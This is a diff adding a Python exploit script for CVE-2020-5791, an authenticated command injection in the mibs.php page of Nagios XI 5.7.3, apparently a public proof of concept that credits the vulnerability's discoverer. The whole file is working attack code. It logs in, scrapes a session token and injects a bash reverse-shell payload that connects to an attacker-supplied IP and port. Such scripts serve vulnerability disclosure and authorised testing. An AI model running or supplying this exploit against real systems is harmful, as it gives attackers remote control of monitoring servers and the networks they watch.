@@ -1,0 +1,66 @@
+# Exploit Title: Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)
+# Date: 10-27-2020
+# Vulnerability Discovery: Chris Lyne
+# Vulnerability Details: https://www.tenable.com/security/research/tra-2020-58
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
+# Vendor Changelog: https://www.nagios.com/downloads/nagios-xi/change-log/
+# Software Link: https://www.nagios.com/downloads/nagios-xi/
+# Version: Nagios XI 5.7.3
+# Tested on: Ubuntu 20.04
+# CVE: CVE-2020-5791
+
+#!/usr/bin/python3
+
+import re
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+# Credit: Chris Lyne for vulnerability discovery and original PoC
+
+if len(sys.argv) != 6:
+    print("[~] Usage : ./exploit.py https://NagiosXI_Host/, Username, Password, Attacker IP, Attacker Port")
+    exit()
+
+host = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+attacker_ip = sys.argv[4]
+attacker_port = sys.argv[5]
+
+login_url = host + "/nagiosxi/login.php"
+payload = ";/bin/bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1';".format(attacker_ip, attacker_port)
+encoded_payload = urllib.parse.quote_plus(payload)
+
+
+def exploit():
+    s = requests.Session()
+    login_page = s.get(login_url)
+    nsp = re.findall('var nsp_str = "(.*?)"', login_page.text)
+    
+    res = s.post(
+        login_url,
+        data={
+            'nsp': nsp,
+            'page': 'auth',
+            'debug': '',
+            'pageopt': 'login',
+            'redirect': '/nagiosxi/index.php?',
+            'username': username,
+            'password': password,
+            'loginButton': ''
+        },
+        verify=False,
+        allow_redirects=True
+    )
+    
+    injection_url = host + "/nagiosxi/admin/mibs.php?mode=undo-processing&type=1&file={0}".format(encoded_payload)
+    res = s.get(injection_url)
+    
+    if res.status_code != 200:
+            print("[~] Failed to connect")
+    
+if __name__ == '__main__':
+    exploit()
